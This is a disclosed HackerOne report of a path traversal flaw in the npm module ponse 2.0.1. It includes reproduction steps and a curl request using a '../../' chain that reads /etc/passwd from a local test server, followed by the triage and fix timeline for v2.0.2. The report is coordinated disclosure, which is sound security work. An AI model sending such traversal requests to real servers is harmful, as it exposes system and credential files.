---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/path-traversal
  - env/web
  - stack/node
  - vuln/path-traversal
substate: "resolved"
weakness: "Path Traversal"
enriched: true
body: true
date: 2018-07-20
submitted: 2018-07-18T13:28:14.211Z
bounty_usd: null
votes: 4
cve: []
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "szkrstf"
source: "https://hackerone.com/reports/383112"
title: "[ponse] Path traversal in ponse module allows to read any file on server"
---
# [ponse] Path traversal in ponse module allows to read any file on server

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 4 | **Program:** Node.js third-party modules | **Disclosed:** 2018-07-20

- Report: [https://hackerone.com/reports/383112](https://hackerone.com/reports/383112)
- CWE: Path Traversal
- Submitted: 2018-07-18T13:28:14.211Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report path traversal in ponse.
It allows reading local files on the target server.

# Module

**module name:** ponse
**version:** 2.0.1
**npm page:** `https://www.npmjs.com/package/ponse`

## Module Description

Module for work with requests and responses

## Module Stats

[317] downloads in the last week
[1633] downloads in the last month

# Vulnerability

## Vulnerability Description

Path traversal vulnerability in ponse module allows to go up in directory tree and read content of any file, like /etc/passwd.

Vulnerability exists in the getStatic function, because ponse uses user submitted variable without any protection against path traversal attacks.

## Steps To Reproduce:

 - install module
`npm i --save ponse`
 
 - create index.js. for example:
```javascript
var ponse = require('ponse')
var http = require('http')
http.createServer(
    ponse.static(__dirname)
).listen(8080)
```

 - start server
`node index.js`

 - use curl to acces any file on the target server outside the given directory(__dirname). For example:
```
$ curl --path-as-is localhost:1337/../../../../../../../etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/usr/bin/nologin
daemon:x:2:2:daemon:/:/usr/bin/nologin
...
```

## Supporting Material/References:

- linux 4.17.5-1-ARCH
- v10.6.0
- 6.2.0
- curl 7.61.0

# Wrap up

- I contacted the maintainer to let them know: [N] 
- I opened an issue in the related repository: [N]

## Impact

Malicious user can read any file on the target server.

## Timeline

- **Report Filed**
- **2018-07-19** @api_xmgchqhv69rw1zem6733xop0tz: Hello,
Thanks for reporting this to us. Someone will quickly look at this report and triage it.
- **2018-07-19** @marcinhoppe: Hi @szkrstf,

Thanks for reporting this issue.

I was able to reproduce and confirm the issue as you described and will triage this report as vulnerability.
I will invite the package maintainer to this issue.
- **Report Triaged**
- **External User Joined**
- **2018-07-19** @coderaiser: Hello, thank you for the report. I will think about it.
- **2018-07-19** @marcinhoppe: @coderaiser Thanks for joining! Note that we have a policy to disclose the vulnerability to the public within 45 days of triage. Do you think a fix will be available within this timeframe?
- **2018-07-19** @szkrstf: Hi @coderaiser, 

I found this bug while testing  your other project, cloudcmd. I think it's even a bigger problem there. Let me know if I can help you with anything.

Thanks for the quick response by the way
- **2018-07-19** @coderaiser: Fixed with [9b3d6ca](https://github.com/coderaiser/ponse/commit/9b3d6ca9cea1236fe8742e0f962037c4bcb291e9), landed in [v2.0.2](https://github.com/coderaiser/ponse/releases/tag/v2.0.2).
- **2018-07-19** @marcinhoppe: @coderaiser Thanks for a blazing fix :). I re-tested it and it returns HTTP 404 now (expected), but I think response content might reveal information to the attacker that he might not otherwise have (local path of the root folder):

> Path /etc/passwd beyond root /Users/marcin.hoppe/nswg/repro!
- **2018-07-19** @coderaiser: It is an interesting idea to change this, but the same message used in `restafary` so I reused it, if you have an idea of a message that better suited you can send a pull request :).
- **2018-07-19** @marcinhoppe: I will raise a separate issue for this in the GitHub repo and move the discussion there.

@coderaiser @szkrstf Do you agree this fix resolves the problem and we can disclose the vulnerability?
- **2018-07-19** @szkrstf: I can confirm it's fixed. Thank you all
- **2018-07-19** @marcinhoppe: Thanks! I will disclose now.
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **Changed Scope**
